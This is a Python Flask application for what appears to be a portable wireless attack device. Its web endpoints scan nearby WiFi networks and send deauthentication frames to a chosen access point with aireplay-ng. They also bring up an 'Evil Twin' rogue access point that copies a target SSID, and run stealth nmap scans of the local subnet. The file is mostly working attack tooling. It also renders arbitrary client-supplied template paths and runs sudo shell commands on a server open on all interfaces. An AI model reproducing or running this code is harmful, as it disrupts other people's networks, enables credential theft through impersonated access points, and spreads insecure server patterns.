import subprocess
import os
import re
import sys
from flask import Flask, jsonify, request, render_template

# --- SETUP ---
base_dir = os.path.abspath(os.path.dirname(__file__))
template_dir = os.path.join(base_dir, 'templates')
app = Flask(__name__, template_folder=template_dir)

def _run(cmd, timeout=10):
    return subprocess.check_output(cmd, shell=True, timeout=timeout).decode('utf-8').strip()

def _ensure_str(v):
    """Ensure value is str for JSON (bytes -> decode)."""
    if v is None:
        return ""
    if isinstance(v, bytes):
        return v.decode("utf-8", errors="replace")
    return str(v)

def _run_capture(cmd, timeout=10):
    """Run command and return dict: cmd, stdout, stderr, returncode (for debug). All values JSON-serializable."""
    try:
        r = subprocess.run(
            cmd, shell=True, timeout=timeout,
            capture_output=True, text=True
        )
        return {
            "cmd": _ensure_str(cmd),
            "stdout": _ensure_str(r.stdout or "")[-4000:],
            "stderr": _ensure_str(r.stderr or "")[-4000:],
            "returncode": int(r.returncode),
        }
    except subprocess.TimeoutExpired as e:
        out = _ensure_str(getattr(e, "stdout", None) or "")[-4000:]
        err = _ensure_str(getattr(e, "stderr", None) or "")[-4000:]
        return {"cmd": _ensure_str(cmd), "stdout": out, "stderr": err, "returncode": -1, "timeout": True}
    except Exception as e:
        return {"cmd": _ensure_str(cmd), "stdout": "", "stderr": _ensure_str(str(e)), "returncode": -1, "error": _ensure_str(str(e))}

# --- ROUTES ---
@app.route('/')
def home():
    return render_template('index.html')  # Pin / main gatekeeper page

@app.route('/<path:filename>')
def serve_page(filename):
    return render_template(filename)

# --- API: Network Info (IP, gateway, hostname, WiFi SSID) ---
@app.route('/api/network_info')
def network_info():
    try:
        info = []
        try:
            ip_raw = _run("hostname -I", 2)
            info.append(f"IP: {ip_raw.split()[0] if ip_raw else 'N/A'}")
        except Exception:
            info.append("IP: N/A")
        try:
            gw = _run("ip route | grep default | head -1", 2)
            if gw and "via " in gw:
                info.append(f"GW: {gw.split()[2]}")
            else:
                info.append("GW: N/A")
        except Exception:
            info.append("GW: N/A")
        try:
            info.append(f"HOST: {_run('hostname', 2)}")
        except Exception:
            info.append("HOST: N/A")
        try:
            out = _run("nmcli -t -f active,ssid dev wifi 2>/dev/null | grep yes || true", 2)
            ssid = (out.split(":")[-1].strip() if out else "") or "N/A"
            info.append(f"WIFI: {ssid}")
        except Exception:
            info.append("WIFI: N/A")
        try:
            uptime = _run("uptime -p 2>/dev/null || cat /proc/uptime", 2)
            if uptime.startswith("up "):
                info.append(f"UP: {uptime[3:][:30]}")
            else:
                info.append("UP: OK")
        except Exception:
            info.append("UP: N/A")
        return jsonify(info)
    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

# --- API: Ping (sanitize host to prevent injection) ---
@app.route('/api/ping')
def ping_host():
    host = request.args.get("host", "8.8.8.8").strip()
    if not re.match(r"^[a-zA-Z0-9.\-]+$", host) or len(host) > 64:
        return jsonify(["ERROR: Invalid host"])
    try:
        out = _run(f"ping -c 3 -W 2 {host} 2>&1", timeout=15)
        return jsonify([line for line in out.split("\n") if line][:12])
    except subprocess.TimeoutExpired:
        return jsonify([f"TIMEOUT: {host}"])
    except Exception as e:
        return jsonify([f"FAIL: {str(e)}"])

@app.route('/api/ping_gateway')
def ping_gateway():
    try:
        gw = _run("ip route | grep default | head -1", 2)
        if not gw or "via " not in gw:
            return jsonify(["ERROR: No default gateway"])
        host = gw.split()[2]
        if not re.match(r"^[a-zA-Z0-9.\-]+$", host):
            return jsonify(["ERROR: Invalid gateway"])
        out = _run(f"ping -c 3 -W 2 {host} 2>&1", timeout=15)
        return jsonify([f"Gateway: {host}"] + [line for line in out.split("\n") if line][:12])
    except subprocess.TimeoutExpired:
        return jsonify(["TIMEOUT: gateway"])
    except Exception as e:
        return jsonify([f"FAIL: {str(e)}"])

# --- 1. CLEAN SSID SCANNER ---
@app.route('/api/scan_wifi')
def scan_wifi():
    try:
        cmd = "sudo nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list"
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        results = []
        seen = set()
        for line in output.split('\n'):
            if not line: continue
            parts = line.split(':')
            if len(parts) >= 2:
                ssid = parts[0]
                if not ssid or ssid in seen: continue
                seen.add(ssid)
                security_field = parts[2] if len(parts) > 2 else ""
                sec = "SECURE" if "WPA" in security_field or "RSN" in security_field else "OPEN"
                results.append(f"{ssid[:12].ljust(12)} {parts[1]}% {sec}")
        return jsonify(results[:15])
    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

# BSSID regex: 6 hex octets with colons
_BSSID_RE = re.compile(r'(?:^|:)([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})(?=:|$|\s)')

# --- SSID list with BSSID (for Evil Twin / Deauth selection 1–9) ---
@app.route('/api/scan_wifi_list')
def scan_wifi_list():
    try:
        cmd = "sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list"
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        results = []
        seen_ssid = set()
        for line in output.split('\n'):
            if not line or len(results) >= 9:
                continue
            # Extract BSSID by regex (works even if SSID contains colons)
            bssid_match = _BSSID_RE.search(line)
            bssid = (bssid_match.group(1).upper() if bssid_match else "")
            parts = line.split(':')
            # SSID is first field; if we found BSSID, SSID is everything before it in the line
            if bssid_match:
                ssid = line[:bssid_match.start()].rstrip(':') or (parts[0] if parts else "")
            else:
                ssid = parts[0] if parts else ""
            if not ssid or ssid in seen_ssid:
                continue
            seen_ssid.add(ssid)
            # Signal: last numeric field often; or parts after BSSID
            signal = "0"
            if len(parts) >= 8:
                signal = parts[7] if parts[7].isdigit() else (parts[-1] if parts[-1].isdigit() else "0")
            channel = parts[8] if len(parts) > 8 else "?"
            results.append({"ssid": ssid, "bssid": bssid, "signal": signal, "channel": channel})
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Debug: raw nmcli output (see exact format for BSSID parsing) ---
@app.route('/api/scan_wifi_list_raw')
def scan_wifi_list_raw():
    try:
        cmd = "sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list"
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        lines = [line for line in output.split('\n') if line][:12]
        return jsonify({"raw_lines": lines, "hint": "Each line is SSID:BSSID:SIGNAL:CHAN (BSSID has colons)"})
    except Exception as e:
        return jsonify({"error": str(e)})

# --- Deauth: requires aircrack-ng, interface in monitor mode ---
@app.route('/api/deauth', methods=['POST'])
def deauth():
    try:
        data = request.get_json(force=True, silent=True) or {}
        bssid = (data.get("bssid") or "").strip().upper()
        debug = {"received": bssid, "length": len(bssid)}
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            return jsonify({"error": "Invalid BSSID", "debug": debug, "hint": "Use format AA:BB:CC:DD:EE:FF"})
        for iface in ["wlan0mon", "wlan1mon", "wlan0", "wlan1"]:
            try:
                out = _run(f"sudo aireplay-ng -0 5 -a {bssid} {iface} 2>&1", timeout=15)
                return jsonify({"ok": True, "msg": f"Deauth sent on {iface}", "log": out[:500], "debug": debug})
            except Exception as e:
                debug["last_error"] = str(e)
                continue
        return jsonify({"error": "aireplay-ng failed (try monitor mode: airmon-ng start wlan0)", "debug": debug})
    except Exception as e:
        return jsonify({"error": str(e), "debug": {"exception": str(e)}})

# --- Evil Twin: write hostapd config, run hostapd -d, return command + output ---
EVIL_TWIN_CONFIG = "evil_twin.conf"

@app.route('/api/evil_twin', methods=['POST'])
def evil_twin():
    try:
        data = request.get_json(force=True, silent=True) or {}
        ssid = (data.get("ssid") or "").strip()[:32]
        debug = {"received_ssid": ssid, "length": len(ssid)}
        if not ssid:
            return jsonify({"error": "SSID required", "debug": debug})
        if not re.match(r"^[ -~]+$", ssid):
            return jsonify({"error": "Invalid SSID", "debug": debug})

        config_path = os.path.join(base_dir, EVIL_TWIN_CONFIG)
        # Minimal hostapd config (escape SSID: no newlines)
        ssid_safe = ssid.replace("\n", "").replace("\r", "")
        config_body = f"""# Evil Twin - generated for SSID: {ssid_safe}
interface=wlan0
driver=nl80211
ssid={ssid_safe}
channel=6
hw_mode=g
"""
        try:
            with open(config_path, "w") as f:
                f.write(config_body)
        except Exception as e:
            return jsonify({"error": f"Could not write config: {e}", "debug": debug})

        # Run hostapd in debug mode (-d) so you see full startup/output; timeout after 8s
        cmd = f"sudo hostapd -d {config_path} 2>&1"
        run_result = _run_capture(cmd, timeout=8)
        debug["config_path"] = str(config_path)
        debug["config_preview"] = config_body.strip()[:500]
        debug["hostapd"] = {k: _ensure_str(v) if k in ("cmd", "stdout", "stderr") else v for k, v in run_result.items()}

        stdout_str = _ensure_str(run_result.get("stdout", ""))
        hint = None
        if "unavailable" in stdout_str.lower() or "INTERFACE_UNAVAILABLE" in stdout_str or "STOP_AP" in stdout_str:
            hint = "wlan0 was taken by NetworkManager/wpa_supplicant. To run AP: release the interface first (e.g. nmcli dev set wlan0 managed no, or use a second WiFi interface for AP)."

        payload = {
            "ok": run_result.get("returncode", -1) == 0 or run_result.get("timeout"),
            "msg": f"Evil Twin target: {ssid}",
            "cmd": _ensure_str(run_result.get("cmd", cmd)),
            "stdout": stdout_str,
            "stderr": _ensure_str(run_result.get("stderr", "")),
            "returncode": int(run_result.get("returncode", -1)),
            "timeout": bool(run_result.get("timeout", False)),
            "debug": debug,
        }
        if hint:
            payload["hint"] = hint
        return jsonify(payload)
    except Exception as e:
        return jsonify({"error": str(e), "debug": {"exception": str(e)}})

# --- Evil Twin: start full AP (script) — reachable at http://192.168.4.1:5000 when AP is up ---
AP_SCRIPT_START = "scripts/start_evil_twin_ap.sh"
AP_SCRIPT_STOP = "scripts/stop_ap.sh"
AP_IP = "192.168.4.1"

@app.route('/api/evil_twin_start', methods=['POST'])
def evil_twin_start():
    """Run start_evil_twin_ap.sh with SSID; AP comes up at 192.168.4.1, UI at http://192.168.4.1:5000."""
    try:
        data = request.get_json(force=True, silent=True) or {}
        ssid = (data.get("ssid") or "").strip()[:32]
        if not ssid or not re.match(r"^[ -~]+$", ssid):
            return jsonify({"error": "Valid SSID required"})
        script = os.path.join(base_dir, AP_SCRIPT_START)
        if not os.path.isfile(script):
            return jsonify({"error": f"Script not found: {script}"})
        cmd = f"sudo bash '{script}' '{ssid}' 2>&1"
        run_result = _run_capture(cmd, timeout=25)
        return jsonify({
            "ok": run_result.get("returncode") == 0,
            "msg": f"AP start: {ssid}",
            "url": f"http://{AP_IP}:5000",
            "cmd": _ensure_str(run_result.get("cmd", cmd)),
            "stdout": _ensure_str(run_result.get("stdout", "")),
            "stderr": _ensure_str(run_result.get("stderr", "")),
            "returncode": int(run_result.get("returncode", -1)),
        })
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/api/evil_twin_stop', methods=['POST'])
def evil_twin_stop():
    """Run stop_ap.sh; wlan0 returns to NetworkManager."""
    try:
        script = os.path.join(base_dir, AP_SCRIPT_STOP)
        if not os.path.isfile(script):
            return jsonify({"error": f"Script not found: {script}"})
        cmd = f"sudo bash '{script}' 2>&1"
        run_result = _run_capture(cmd, timeout=15)
        return jsonify({
            "ok": run_result.get("returncode") == 0,
            "msg": "AP stopped",
            "cmd": _ensure_str(run_result.get("cmd", cmd)),
            "stdout": _ensure_str(run_result.get("stdout", "")),
            "stderr": _ensure_str(run_result.get("stderr", "")),
            "returncode": int(run_result.get("returncode", -1)),
        })
    except Exception as e:
        return jsonify({"error": str(e)})

# --- 2. VULNERABILITY MONITOR (High-Risk Ports) ---
@app.route('/api/nmap', strict_slashes=False)
def nmap_scan():
    try:
        # 1. Get Local Subnet
        # hostname -I usually returns "192.168.1.15 ..."
        my_ip_raw = subprocess.check_output("hostname -I", shell=True).decode('utf-8').strip()
        if not my_ip_raw: return jsonify(["ERROR: No Network"])
        
        my_ip = my_ip_raw.split(' ')[0]
        # Create subnet 192.168.1.0/24
        subnet = f"{'.'.join(my_ip.split('.')[:3])}.0/24"
        
        print(f"[LOG] Scanning Danger Ports on {subnet}")
        
        # 2. RUN STEALTH SCAN (-sS) ON DANGER PORTS
        # 21=FTP, 23=Telnet, 445=SMB(Windows), 3389=RDP, 8080=AltWeb
        # --open: Only show devices with these holes open
        cmd = f"sudo nmap -sS -p 21,23,445,3389,8080 --open -n {subnet} --exclude {my_ip}"
        
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        
        # 3. Clean Output
        clean_res = []
        clean_res.append(f"TARGET: {subnet}")
        
        current_ip = ""
        found_vuln = False
        
        for line in output.split('\n'):
            # Detect IP Line
            if "scan report" in line:
                current_ip = line.split("for ")[1]
            
            # Detect Open Port Line
            if "open" in line and "tcp" in line:
                found_vuln = True
                # Line example: "445/tcp open  microsoft-ds"
                parts = line.split() # Splits by any whitespace
                port = parts[0].split('/')[0] # Get 445
                service = parts[-1] # Get service name (last item)
                
                clean_res.append(f"{current_ip} > {port} ({service})")

        if not found_vuln:
            clean_res.append("SECURE: No vulnerable ports found.")
            
        return jsonify(clean_res)

    except Exception as e:
        return jsonify([f"FAIL: {str(e)}"])

if __name__ == '__main__':
    # Listen on all interfaces
    app.run(host='0.0.0.0', port=5000)
